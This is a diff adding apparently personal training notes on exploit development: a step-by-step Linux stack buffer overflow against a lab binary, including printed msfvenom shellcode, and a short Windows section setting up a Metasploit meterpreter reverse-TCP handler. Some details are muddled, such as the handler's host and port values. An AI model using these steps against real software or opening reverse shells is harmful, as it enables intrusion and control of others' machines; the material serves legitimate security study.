@@ -6,3 +6,123 @@ REV ENG
 EXPDEV
 POST EX 
 PRIV ESC
+
+
+------------------------------------Buffer Overflow--------------------------------------------------------------------------
+Linux Buffer Overflow -------------------------  demostuff_script.py
+strings func
+	(Look thorugh strings for possible identifers as to is its windows or linux, commands, function names)
+file func
+	(tells what type of file it is)
+./func
+$(echo "whoami")                    
+	(This is command substitution)
+./func $(echo "whoami")
+	(Didn't work, so it dosen't accept arguements)
+./func <<<$(echo "asdasdasdasd")
+	(Running it as input for the command)
+
+gdb ./func
+info functions
+	Functions found: void getuserinput(void);
+			  void main(int, char **);
+pdisass main
+	(peda plug in does color coding, investigate green or red things)
+pdisass getuserinput
+
+(Make a script)
+vim demostuff_script.py
+	#!/usr/bin/env python
+
+	buff = "A" * 50
+
+	print(buff)
+	
+	:w
+chmod u+x  demostuff_script.py	
+run <<<$(./demostuff_script.py)
+change buffer to 100
+run <<<$(./demostuff_script.py)
+
+Go to wiremask.eu
+	-> tools
+		-> Buffer overflow pattern
+		   200 input 
+		   Put it into script like: buff = "<wiremask output>"
+		   # old buff line
+(Find EIP value and copy it into wiremask)
+EIP: 0x31634130
+
+Edit script line
+	uncomment # old line and change value to 62: buff = "A" * 62
+	get ride of long out put line with wiremask
+	make eip line: eip = "BBBB"
+	Add eip to print line: print(buff+eip)
+	EIP output when running the script again through "run <<<$(./demostuff_script.py)" the eip should be 0x42424242
+env - gdb ./func        (On Lin OPS)
+show env                (Get rid of enviorment variables)
+	unset env LINES
+	unset env COLUMNS
+run                     (type in a really long string)
+info proc map
+Value after the heap/start of the stack: 0xf7de1000
+Value at the end of the output/end of the stack: 0xffffe000
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+grab first 4 jump esp locations:
+		0xf7de3b59
+		0xf7f588ab
+		0xf7f645fb
+		0xf7f6460f
+Turn it into little Endian in script :
+		#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+		Put little Endian into eip, (the last part of line above)
+		Then make new nop line:   nop = "\x90" * 15
+		add nop to print statement
+		
+msfvenom -p <payload> CMD=<command> -b '\x00' -f python
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+
+Output for payload:
+	buf =  b""
+	buf += b"\xbb\x04\xeb\x4a\xd0\xda\xc9\xd9\x74\x24\xf4\x5d"
+	buf += b"\x29\xc9\xb1\x0b\x83\xed\xfc\x31\x5d\x10\x03\x5d"
+	buf += b"\x10\xe6\x1e\x20\xdb\xbe\x79\xe7\xbd\x56\x57\x6b"
+	buf += b"\xcb\x41\xcf\x44\xb8\xe5\x10\xf3\x11\x97\x79\x6d"
+	buf += b"\xe7\xb4\x28\x99\xf0\x3a\xcd\x59\x88\x52\xa2\x38"
+	buf += b"\x1b\xcb\x3c\xec\xb0\x82\xdc\xdf\xb7"
+	(Paste it into script)
+	Add buf to print statement
+	
+run <<<$(./demostuff_script.py)         (This should return an error and then the ouput of the command you put into the script)
+
+
+
+
+
+
+
+
+
+------------------------------------Windows Buffer Overflow----------------------------------------------------------
+
+msfvenom -p windows/x86/exec CMD=type -b '\x00' -f python
+
+
+For Windows script 
+  msfconsole
+  use multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  show options
+  set LHOST 0.0.0.0
+  set LPORT <tunnel IP>
+  exploit
+  
+  
+  
+  ------------------------------------Reverse Engineering----------------------------------------------
+  
+  if x >> 4 = 56 {
+  <cod>
+  }
+  
+  896 = x
